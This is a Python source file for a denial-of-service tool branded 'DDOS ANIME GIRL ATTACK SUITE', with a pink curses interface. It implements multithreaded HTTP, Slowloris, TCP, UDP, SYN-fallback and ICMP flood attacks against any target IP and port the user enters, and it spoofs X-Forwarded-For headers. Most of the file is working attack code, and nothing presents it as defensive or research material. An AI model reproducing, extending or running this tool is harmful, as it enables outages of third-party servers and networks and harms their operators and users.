#!/usr/bin/env python3
import curses
import socket
import threading
import random
import time
import requests
from datetime import datetime

# Color pairs for pink theme
COLOR_PINK = 1
COLOR_HOTPINK = 2
COLOR_WHITE = 3
COLOR_RED = 4

stats = {
    'total_packets': 0,
    'total_bytes': 0,
    'active_threads': 0,
    'method': 'None',
    'running': False,
    'target': '',
    'port': 12000,
    'rps': 0,
    'last_second': 0
}

sockets_pool = []

banner = r"""
    ╔══════════════════════════════════════════════════════════╗
    ║     🌸  DDOS ANIME GIRL ATTACK SUITE v3.0  🌸           ║
    ║     "Kawaii but Deadly ~ Senpai Notice Me!"             ║
    ╚══════════════════════════════════════════════════════════╝
"""

methods = {
    '1': 'HTTP FLOOD',
    '2': 'SLOWLORIS',
    '3': 'TCP FLOOD',
    '4': 'UDP FLOOD',
    '5': 'SYN FLOOD',
    '6': 'ICMP FLOOD',
    '7': 'ALL METHODS (HADES MODE)'
}

def http_flood(target_ip, port):
    urls = [
        f"http://{target_ip}:{port}/",
        f"http://{target_ip}:{port}/wp-admin",
        f"http://{target_ip}:{port}/api",
        f"http://{target_ip}:{port}/login"
    ]
    headers = [
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
        {'User-Agent': 'KawaiiBot/1.0', 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
        {'User-Agent': 'AnimeGirl/2.0', 'Accept': 'text/html,application/xhtml+xml'}
    ]
    while stats['running']:
        try:
            url = random.choice(urls)
            header = random.choice(headers)
            requests.get(url, headers=header, timeout=2)
            stats['total_packets'] += 1
            stats['total_bytes'] += 512
        except:
            pass

def slowloris(target_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect((target_ip, port))
        sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {target_ip}\r\n".encode())
        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
        sock.send("Accept-language: en-US,en;q=0.5\r\n".encode())
        
        while stats['running']:
            sock.send(f"X-Random-{random.randint(0, 9999)}: {random.randint(0, 9999)}\r\n".encode())
            stats['total_packets'] += 1
            stats['total_bytes'] += 64
            time.sleep(5)
    except:
        pass

def tcp_flood(target_ip, port):
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, port))
            payload = random._urandom(1024) + b"\x00" * 512
            sock.send(payload * 10)
            stats['total_packets'] += 100
            stats['total_bytes'] += len(payload) * 10
            sock.close()
        except:
            pass

def udp_flood(target_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while stats['running']:
        payload = random._urandom(65500)
        sock.sendto(payload, (target_ip, port))
        stats['total_packets'] += 1
        stats['total_bytes'] += 65500

def syn_flood(target_ip, port):
    # Raw socket requires root, fallback to TCP
    tcp_flood(target_ip, port)

def icmp_flood(target_ip, port):
    # Ping flood
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x01' + b'\x00\x02' + random._urandom(64)
            sock.sendto(packet, (target_ip, 0))
            stats['total_packets'] += 1
            stats['total_bytes'] += 64
        except:
            pass

def all_methods(target_ip, port):
    methods_list = [http_flood, slowloris, tcp_flood, udp_flood, syn_flood, icmp_flood]
    while stats['running']:
        random.choice(methods_list)(target_ip, port)

def start_attack(target_ip, port, method_choice):
    stats['target'] = target_ip
    stats['port'] = port
    stats['method'] = methods[method_choice]
    stats['running'] = True
    
    threads = []
    method_func = {
        '1': http_flood,
        '2': slowloris,
        '3': tcp_flood,
        '4': udp_flood,
        '5': syn_flood,
        '6': icmp_flood,
        '7': all_methods
    }[method_choice]
    
    for i in range(150):
        t = threading.Thread(target=method_func, args=(target_ip, port))
        t.daemon = True
        t.start()
        threads.append(t)
        stats['active_threads'] = i + 1

def draw_ui(stdscr):
    curses.start_color()
    curses.init_pair(COLOR_PINK, curses.COLOR_MAGENTA, curses.COLOR_BLACK)
    curses.init_pair(COLOR_HOTPINK, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(COLOR_WHITE, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(COLOR_RED, curses.COLOR_RED, curses.COLOR_BLACK)
    
    curses.curs_set(0)
    stdscr.nodelay(1)
    
    last_packets = 0
    last_time = time.time()
    
    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()
        
        # Pink border
        stdscr.attron(curses.color_pair(COLOR_PINK))
        for i in range(width):
            stdscr.addch(0, i, '═')
            stdscr.addch(height-1, i, '═')
        for i in range(height):
            stdscr.addch(i, 0, '║')
            stdscr.addch(i, width-1, '║')
        stdscr.addch(0, 0, '╔')
        stdscr.addch(0, width-1, '╗')
        stdscr.addch(height-1, 0, '╚')
        stdscr.addch(height-1, width-1, '╝')
        
        # Title
        title = "🌸 DDOS ANIME GIRL ATTACK SUITE 🌸"
        stdscr.attron(curses.color_pair(COLOR_HOTPINK) | curses.A_BOLD)
        stdscr.addstr(1, (width - len(title)) // 2, title)
        
        # Anime girl ASCII
        anime_girl = [
            "     ╱|、",
            "   (˚ˎ 。7  ",
            "    |、˜〵   ",
            "    じしˍ,)ノ   ~ Senpai ~"
        ]
        for i, line in enumerate(anime_girl):
            stdscr.attron(curses.color_pair(COLOR_PINK))
            stdscr.addstr(3 + i, 2, line)
        
        # Stats box
        stdscr.attron(curses.color_pair(COLOR_WHITE))
        stdscr.addstr(3, 40, "┌─────────────────────────────┐")
        stdscr.addstr(4, 40, "│     📊 REAL-TIME STATS       │")
        stdscr.addstr(5, 40, "├─────────────────────────────┤")
        
        now = time.time()
        if now - last_time >= 1:
            stats['rps'] = stats['total_packets'] - last_packets
            last_packets = stats['total_packets']
            last_time = now
        
        stats_lines = [
            f"│ 🎯 Target : {stats['target']}:{stats['port']}",
            f"│ ⚔️ Method : {stats['method']}",
            f"│ 💥 Packets: {stats['total_packets']:,}",
            f"│ 📦 Bytes  : {stats['total_bytes']/1024/1024:.2f} MB",
            f"│ ⚡ RPS    : {stats['rps']}",
            f"│ 🧵 Threads: {stats['active_threads']}",
            f"│ 🟢 Status : {'ATTACKING' if stats['running'] else 'IDLE'}",
        ]
        
        for i, line in enumerate(stats_lines):
            stdscr.addstr(6 + i, 40, line)
        stdscr.addstr(6 + len(stats_lines), 40, "└─────────────────────────────┘")
        
        # Menu
        menu_y = 15
        stdscr.attron(curses.color_pair(COLOR_HOTPINK) | curses.A_BOLD)
        stdscr.addstr(menu_y, 2, "⚔️ SELECT ATTACK METHOD ⚔️")
        stdscr.attron(curses.color_pair(COLOR_WHITE))
        
        for key, method in methods.items():
            stdscr.addstr(menu_y + int(key) + 1, 4, f"[{key}] {method}")
        
        stdscr.addstr(menu_y + 9, 4, "[S] START ATTACK")
        stdscr.addstr(menu_y + 10, 4, "[X] STOP ATTACK")
        stdscr.addstr(menu_y + 11, 4, "[Q] QUIT")
        
        # Input
        stdscr.attron(curses.color_pair(COLOR_PINK))
        stdscr.addstr(height-3, 2, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        stdscr.addstr(height-2, 2, "💬 Command: ")
        
        key = stdscr.getch()
        
        if key == ord('q') or key == ord('Q'):
            stats['running'] = False
            break
        elif key == ord('s') or key == ord('S'):
            if not stats['running']:
                curses.echo()
                stdscr.addstr(height-2, 12, "Enter Target IP: ")
                target = stdscr.getstr(height-2, 28, 50).decode('utf-8')
                stdscr.addstr(height-2, 12, "Enter Port [12000]: ")
                port_str = stdscr.getstr(height-2, 32, 10).decode('utf-8')
                port = int(port_str) if port_str else 12000
                stdscr.addstr(height-2, 12, "Method [1-7]: ")
                method = stdscr.getstr(height-2, 25, 1).decode('utf-8')
                curses.noecho()
                
                if method in methods:
                    threading.Thread(target=start_attack, args=(target, port, method), daemon=True).start()
                    stdscr.addstr(height-2, 12, "✅ Attack started!     ")
        elif key == ord('x') or key == ord('X'):
            stats['running'] = False
            stats['active_threads'] = 0
            stdscr.addstr(height-2, 12, "🛑 Attack stopped!     ")
        
        stdscr.refresh()
        time.sleep(0.1)

def main():
    print(banner)
    print("\033[95m🌸 Welcome to Anime DDoS Suite! Starting GUI...\033[0m")
    time.sleep(1)
    curses.wrapper(draw_ui)

if __name__ == "__main__":
    main()
